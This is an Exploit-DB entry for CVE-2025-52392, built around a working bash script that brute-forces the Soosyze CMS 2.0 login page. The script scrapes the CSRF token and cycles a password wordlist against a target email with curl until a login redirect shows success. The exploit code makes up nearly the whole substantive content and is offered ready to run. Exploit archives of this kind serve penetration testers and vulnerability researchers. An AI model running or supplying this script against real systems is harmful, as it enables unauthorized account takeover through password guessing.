---
title: [webapps] Soosyze CMS 2.0 - Brute Force Login
url: https://www.exploit-db.com/exploits/52416
source: Exploit-DB.com RSS Feed
date: 2025-08-19
fetch_date: 2025-10-07T00:16:12.537451
---

# [webapps] Soosyze CMS 2.0 - Brute Force Login

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Soosyze CMS 2.0 - Brute Force Login

#### EDB-ID:

###### 52416

#### CVE:

###### [2025-52392](https://nvd.nist.gov/vuln/detail/CVE-2025-52392)

---

**EDB Verified:**

#### Author:

###### [Beatriz Fresno Naumova](/?author=12312)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-18

---

**Vulnerable App:**

```
# Exploit Title: Soosyze CMS 2.0 - Brute Force Login
# Google Dork: N/A
# Date: 2025-08-13
# Exploit Author: Beatriz Fresno Naumova (beafn28)
# Vendor Homepage: https://soosyze.com/
# Software Link: https://github.com/soosyze/soosyze
# Version: 2.0 (tested)
# Tested on: macOS Sonoma 14.x (Apple Silicon M1), /bin/bash 3.2 & Homebrew bash 5.2, curl 8.x, BSD sed
# CVE : CVE-2025-52392

# Description:
# Soosyze CMS 2.0 allows brute-force login attacks via /user/login due to missing rate limiting
# and account lockout mechanisms. An attacker can submit unlimited POST requests with a known
# username/email and a password wordlist, potentially gaining unauthorized access (CWE-307).

# PoC Usage:
#   ./script.sh [wordlist.txt]
# If no wordlist is provided, a dictionary is used.

#!/usr/bin/env bash

set -euo pipefail

BASE_URL="http://localhost:8000"
LOGIN_PATH="/user/login"
EMAIL_FIELD="email"
PASS_FIELD="password"
TARGET_EMAIL="test@test.com"

WORDLIST_FILE="${1:-}"
DEFAULT_WORDS=("123456" "admin" "password" "qwerty" "letmein" "admin123" "password1")

form_url="$BASE_URL$LOGIN_PATH"
COOKIE_JAR="$(mktemp)"

get_form() {
    curl -sS -c "$COOKIE_JAR" -b "$COOKIE_JAR" "$form_url" > /tmp/login_page.html
}

extract_token() {
    local name value
    name=$(sed -nE 's/.*name="([_a-zA-Z0-9:-]*(token|csrf)[_a-zA-Z0-9:-]*)".*type="hidden".*/\1/p' /tmp/login_page.html | head -n1 || true)
    value=""
    if [[ -n "$name" ]]; then
        value=$(sed -nE "s/.*name=\"$name\".*value=\"([^\"]*)\".*/\1/p" /tmp/login_page.html | head -n1 || true)
    fi
    printf '%s\t%s\n' "$name" "$value"
}

post_login() {
    local pass="$1" tname="$2" tval="$3"
    curl -sS -o /tmp/resp.html -w "%{http_code}" \
        -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
        -X POST "$form_url" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Origin: $BASE_URL" -H "Referer: $form_url" \
        --data-urlencode "$EMAIL_FIELD=$TARGET_EMAIL" \
        --data-urlencode "$PASS_FIELD=$pass" \
        $( [[ -n "$tname" && -n "$tval" ]] && printf -- '--data-urlencode %s=%s' "$tname" "$tval" )
}

echo "[*] Starting brute-force attack on $form_url"
[[ -n "$WORDLIST_FILE" && -r "$WORDLIST_FILE" ]] && mapfile -t words < "$WORDLIST_FILE" || words=("${DEFAULT_WORDS[@]}")

i=0
for pw in "${words[@]}"; do
    i=$((i+1))
    get_form
    IFS=$'\t' read -r TOKEN_NAME TOKEN_VALUE < <(extract_token)
    code=$(post_login "$pw" "$TOKEN_NAME" "$TOKEN_VALUE")

    if grep -q '"redirect"' /tmp/resp.html; then
        echo -e "[$i] Password found: '\e[1m$pw\e[0m' (HTTP $code)"
        break
    else
        echo "[$i] '$pw' (HTTP $code)"
    fi

    sleep 0.$((RANDOM%9+1))
done

rm -f "$COOKIE_JAR" /tmp/resp.html
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began c...